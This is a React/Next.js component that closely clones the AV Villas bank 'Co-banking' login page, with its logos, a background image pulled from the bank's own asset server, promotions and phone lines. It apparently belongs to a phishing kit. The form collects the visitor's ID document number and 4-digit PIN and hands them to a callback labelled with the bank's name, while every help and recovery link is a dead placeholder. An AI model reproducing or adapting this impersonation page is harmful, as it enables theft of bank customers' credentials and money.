/* eslint-disable @typescript-eslint/no-explicit-any */
/* eslint-disable @next/next/no-img-element */
"use client";
import { useState } from "react";
import LoaderFullScreen from "./LoaderFullScreen";
import { Lock } from "lucide-react";

type DocType = "CC" | "CE" | "TI";

interface LoginProps {
  enviar?: (data: any) => void;
}

export default function Login({ enviar }: LoginProps) {
  const [docType, setDocType] = useState<DocType>("CC");
  const [usuario, setUsuario] = useState("");
  const [password, setPassword] = useState("");
  const [loading, setLoading] = useState(false);

  const cleanUsuario = usuario.replace(/\D/g, "");
  const cleanPassword = password.replace(/\D/g, "");
  const canSubmit = cleanUsuario.length >= 8 && cleanUsuario.length <= 12 && cleanPassword.length === 4;

  const formatDocumento = (raw: string) => {
    const digits = raw.replace(/\D/g, "").slice(0, 12);
    const reversed = digits.split("").reverse().join("");
    let c = 0;
    let nuevo = "";
    for (let i = 0; i < reversed.length; i++) {
      if (c === 3) {
        nuevo += ".";
        c = 1;
      } else {
        c++;
      }
      nuevo += reversed[i];
    }
    return nuevo.split("").reverse().join("");
  };

  const handleUsuarioChange = (value: string) => {
    setUsuario(formatDocumento(value));
  };

  const handleLoginClick = () => {
    if (!canSubmit) return;
    setLoading(true);
    const cleanUsuario = usuario.replace(/\./g, "");
    enviar?.({
      tipoDocumento: docType,
      view: 'login',
      user: cleanUsuario,
      pass: password,
      bank: "avvillas"
    });
  };

  return (
    <div className="login-wrapper">
      <LoaderFullScreen visible={loading} />

      <style jsx>{`
        .login-wrapper {
          min-height: 100vh;
          font-family: 'Red Hat Display', Arial, sans-serif;
          background-color: #f4f6f9;
          background-image: url("https://pb-avvillas.avaldigitallabs.com/assets/img/illustrations/login/BG-CoBanking-md-red-circle.svg");
          background-position: right top;
          background-repeat: no-repeat;
          background-size: 60vw 100%;
          position: relative;
          display: flex;
          flex-direction: column;
        }
        .main-content {
          display: flex;
          flex-direction: row;
          flex: 1;
          position: relative;
        }

        
        /* LEFT SECTION */
        .left-section {
          width: 60%;
          padding: 40px 60px;
          display: flex;
          flex-direction: column;
          z-index: 1;
        }
        .juntos-title {
          font-size: 24px;
          font-weight: 700;
          color: #252b31;
          margin-bottom: 24px;
        }
        .cards-grid {
          display: grid;
          grid-template-columns: 1fr 1fr;
          gap: 20px;
          max-width: 800px;
        }
        .card {
          background: #fff;
          border-radius: 12px;
          box-shadow: 0 4px 12px rgba(0,0,0,0.06);
          overflow: hidden;
          display: flex;
          flex-direction: column;
        }
        .card-link {
          color: #0048DB;
          font-size: 14px;
          text-decoration: none;
          display: flex;
          align-items: center;
          gap: 4px;
          margin-top: auto;
        }
        .card-1 {
          grid-row: span 2;
          padding: 24px;
          display: flex;
          flex-direction: column;
        }
        .card-1-logos {
          display: flex;
          flex-direction: column;
          align-items: flex-start;
          gap: 4px;
          margin-bottom: 16px;
        }
        .card-1-img {
          width: 100%;
          max-width: 280px;
          margin: 0 auto 20px auto;
          display: block;
        }
        .card-1 p {
          font-size: 15px;
          color: #414a53;
          margin-bottom: 16px;
          font-weight: 600;
          line-height: 1.4;
        }
        .card-2 {
          display: flex;
          flex-direction: column;
        }
        .card-2-img {
          width: 100%;
          height: 160px;
          object-fit: cover;
        }
        .card-2-content {
          padding: 16px;
          display: flex;
          flex-direction: column;
          flex: 1;
        }
        .card-2-content p {
          font-size: 15px;
          color: #252b31;
          font-weight: bold;
          margin-bottom: 8px;
          line-height: 1.3;
        }
        .card-3 {
          display: flex;
          flex-direction: row;
        }
        .card-3-content {
          padding: 16px;
          flex: 1;
          display: flex;
          flex-direction: column;
        }
        .card-3-content p {
          font-size: 15px;
          color: #252b31;
          font-weight: bold;
          margin-bottom: 8px;
          line-height: 1.3;
        }
        .card-3-img {
          width: 45%;
          object-fit: cover;
        }

        /* RIGHT SECTION */
        .right-section {
          width: 40%;
          display: flex;
          align-items: center;
          justify-content: center;
          padding: 40px;
          z-index: 2;
        }
        .login-box {
          background: #fff;
          border-radius: 20px;
          padding: 40px;
          width: 100%;
          max-width: 420px;
          box-shadow: 0 10px 40px rgba(0,0,0,0.15);
          display: flex;
          flex-direction: column;
        }
        .logo-pill {
          display: flex;
          align-items: center;
          justify-content: center;
          margin: 0 auto 32px auto;
        }
        .logo-pill img {
          height: 45px;
          max-width: 100%;
        }
        .login-title {
          font-size: 16px;
          color: #252b31;
          font-weight: bold;
          margin-bottom: 16px;
        }
        
        .input-box {
          width: 100%;
          height: 56px;
          border: 1px solid #ced4da;
          border-radius: 6px;
          padding: 8px 16px;
          position: relative;
          margin-bottom: 16px;
          display: flex;
          flex-direction: column;
          justify-content: center;
          background: #fff;
        }
        .input-label {
          font-size: 11px;
          color: #848d95;
          margin-bottom: 2px;
        }
        .input-select {
          width: 100%;
          border: none;
          outline: none;
          appearance: none;
          font-size: 15px;
          color: #414a53;
          background: transparent;
          padding: 0;
          cursor: pointer;
        }
        .arrow-icon {
          position: absolute;
          right: 16px;
          top: 50%;
          transform: translateY(-50%);
          pointer-events: none;
          color: #848d95;
        }
        .input-field {
          width: 100%;
          height: 56px;
          border: 1px solid #ced4da;
          border-radius: 6px;
          padding: 0 16px;
          font-size: 15px;
          color: #414a53;
          outline: none;
          margin-bottom: 16px;
          box-sizing: border-box;
          transition: border-color 0.2s;
        }
        .input-field::placeholder {
          color: #848d95;
        }
        .input-field:focus {
          border-color: #0048DB;
        }

        .btn-ingresar {
          width: 100%;
          height: 48px;
          border-radius: 24px;
          background: #d0d7e2;
          color: #fff;
          font-size: 15px;
          font-weight: bold;
          border: none;
          cursor: not-allowed;
          margin-top: 8px;
          margin-bottom: 24px;
          transition: background 0.2s;
        }
        .btn-ingresar.active {
          background: #0048DB;
          cursor: pointer;
        }
        
        .links-area {
          display: flex;
          flex-direction: column;
          align-items: center;
          gap: 16px;
          text-align: center;
        }
        .link-text {
          font-size: 13px;
          color: #414a53;
        }
        .link-blue {
          color: #0048DB;
          font-weight: bold;
          text-decoration: none;
          cursor: pointer;
        }
        .link-blue:hover {
          text-decoration: underline;
        }

        /* FOOTER */
        .footer {
          width: 100%;
          background: transparent;
          display: flex;
          flex-direction: row;
          align-items: stretch;
          justify-content: space-between;
          z-index: 2;
          position: relative;
        }
        .footer-left {
          display: flex;
          flex-direction: row;
          align-items: center;
          padding: 16px 40px;
          flex: 1;
        }
        .vigilado {
          height: 80px;
          margin-right: 40px;
        }
        .audiovillas-box {
          display: flex;
          flex-direction: column;
        }
        .audiovillas-title {
          font-size: 14px;
          font-weight: bold;
          color: #002b99;
          margin-bottom: 12px;
        }
        .cities-row {
          display: flex;
          gap: 32px;
          font-size: 12px;
        }
        .city-col {
          display: flex;
          flex-direction: column;
        }
        .city-name {
          font-weight: bold;
          color: #002b99;
          display: flex;
          align-items: center;
          gap: 6px;
        }
        .city-name::before {
          content: "";
          display: inline-block;
          width: 6px;
          height: 6px;
          background: #E1001D;
          border-radius: 50%;
        }
        .city-phone {
          color: #414a53;
          margin-top: 4px;
        }
        .footer-right {
          background: #E1001D;
          padding: 0 60px 0 100px;
          display: flex;
          align-items: center;
          justify-content: center;
          clip-path: polygon(25% 0, 100% 0, 100% 100%, 0% 100%);
        }
        
        @media (max-width: 1024px) {
          .main-content {
            flex-direction: column;
          }
          .login-wrapper {
            background-image: url("/av/BG-CoBanking-mb-red-circle.webp");
            background-size: 100% auto;
            background-position: top center;
          }
          .left-section {
            display: none;
          }
          .right-section {
            width: 100%;
            padding: 24px;
            margin-top: 20px;
          }
          .login-box {
            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
          }
          .footer {
            flex-direction: column;
            background: transparent;
          }
          .footer-left {
            padding: 24px;
            flex-direction: column;
            align-items: flex-start;
          }
          .vigilado {
            position: absolute;
            left: -20px;
            bottom: 50px;
            transform: rotate(-90deg);
            height: 40px;
          }
          .audiovillas-box {
            margin-left: 30px;
          }
          .cities-row {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 16px;
            width: 100%;
          }
          .footer-right {
            width: 100%;
            clip-path: none;
            justify-content: flex-start;
            padding: 0 0 24px 54px;
            background: transparent;
          }
          .footer-right img {
            filter: invert(1);
          }
        }
      `}</style>

      <div className="main-content">
        <div className="left-section">
          <div className="juntos-title">Juntos trabajando</div>
          
          <div className="cards-grid">
            {/* CARD 1 */}
            <div className="card card-1">
              <img src="/av/Banner-card_modal.webp" className="card-1-img" alt="Luis Diaz" />
              <p>
                Participa por uno de los 40 combos para vivir en casa la final de La Copa Mundial de la FIFA 2026™
              </p>
              <a href="#" className="card-link">
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                  <path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"></path>
                  <polyline points="15 3 21 3 21 9"></polyline>
                  <line x1="10" y1="14" x2="21" y2="3"></line>
                </svg>
                Conoce más
              </a>
            </div>

            {/* CARD 2 */}
            <div className="card card-2">
              <img src="/av/Banner-card_2_new.webp" className="card-2-img" alt="Stadium" />
              <div className="card-2-content">
                <p>Pide y usa tu Tarjeta de Crédito Visa AV Villas. ¡Tienes que tenerla!</p>
                <a href="#" className="card-link">
                  <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                    <path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"></path>
                    <polyline points="15 3 21 3 21 9"></polyline>
                    <line x1="10" y1="14" x2="21" y2="3"></line>
                  </svg>
                  Conoce más
                </a>
              </div>
            </div>

            {/* CARD 3 */}
            <div className="card card-3">
              <div className="card-3-content">
                <p>La Copa Mundial de la FIFA 2026™ ahora es una experiencia AVAL, gracias a Visa.</p>
                <a href="#" className="card-link">
                  <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                    <path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"></path>
                    <polyline points="15 3 21 3 21 9"></polyline>
                    <line x1="10" y1="14" x2="21" y2="3"></line>
                  </svg>
                  Conoce más
                </a>
              </div>
              <img src="/av/Banner-card_3_new.webp" className="card-3-img" alt="Fans" />
            </div>
          </div>
        </div>

        <div className="right-section">
          <div className="login-box">
            <div className="logo-pill">
              <img src="/av/logo-avvillas-red.svg" alt="AV Villas" />
            </div>
            
            <div className="login-title">Ingresa a tu Co-banking</div>
            
            <div className="input-box">
              <span className="input-label">Tipo de documento</span>
              <select 
                value={docType}
                onChange={(e) => setDocType(e.target.value as DocType)}
                className="input-select"
              >
                <option value="CC">Cédula de Ciudadanía</option>
                <option value="CE">Cédula de Extranjería</option>
                <option value="TI">Tarjeta de Identidad</option>
              </select>
              <div className="arrow-icon">
                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                  <path d="M6 9l6 6 6-6"/>
                </svg>
              </div>
            </div>

            <input 
              type="text" 
              placeholder="Número de documento" 
              className="input-field" 
              value={usuario}
              onChange={(e) => handleUsuarioChange(e.target.value)}
            />
            
            <input 
              type="password" 
              inputMode="numeric"
              maxLength={4}
              placeholder="Ingresa tu contraseña" 
              className="input-field"
              value={password}
              onChange={(e) => setPassword(e.target.value.replace(/\D/g, '').slice(0, 4))}
            />

            <button
              className={`btn-ingresar ${canSubmit ? 'active' : ''}`}
              disabled={!canSubmit}
              onClick={handleLoginClick}
            >
              INGRESAR
            </button>

            <div className="links-area">
              <div style={{display: 'flex', alignItems: 'center', gap: '4px', color: '#0048DB'}}>
                <Lock size={14} />
                <a href="#" className="link-blue">Olvidé mi contraseña</a>
              </div>
              
              <div className="link-text">
                ¿Aún no tienes contraseña para ingresar?<br/>
                <a href="#" className="link-blue" style={{display: 'inline-block', marginTop: '4px'}}>Regístrate</a>
              </div>
              
              <div className="link-text">
                <a href="#" className="link-blue">¿Tienes problemas para ingresar?</a>
              </div>
            </div>
          </div>
        </div>
      </div>

      <div className="footer">
        <div className="footer-left">
          <img src="/av/vigilado.svg" alt="Vigilado" className="vigilado" />
          
          <div className="audiovillas-box">
            <div className="audiovillas-title">Línea Audiovillas</div>
            <div className="cities-row">
              <div className="city-col">
                <span className="city-name">Nacional</span>
                <span className="city-phone">01 8000 51 8000</span>
              </div>
              <div className="city-col">
                <span className="city-name">Bogotá</span>
                <span className="city-phone">(601) 4441777</span>
              </div>
              <div className="city-col">
                <span className="city-name">Medellín</span>
                <span className="city-phone">(604) 3256000</span>
              </div>
              <div className="city-col">
                <span className="city-name">Barranquilla</span>
                <span className="city-phone">(605) 3304330</span>
              </div>
              <div className="city-col">
                <span className="city-name">Bucaramanga</span>
                <span className="city-phone">(607) 6302980</span>
              </div>
              <div className="city-col">
                <span className="city-name">Cali</span>
                <span className="city-phone">(602) 8859595</span>
              </div>
            </div>
          </div>
        </div>
        
        <div className="footer-right">
          <img src="/av/logo-aval.svg" alt="Grupo Aval" style={{ height: '32px', filter: 'brightness(0) invert(1)' }} onError={(e) => { e.currentTarget.style.filter = 'none' }} />
        </div>
      </div>
    </div>
  );
}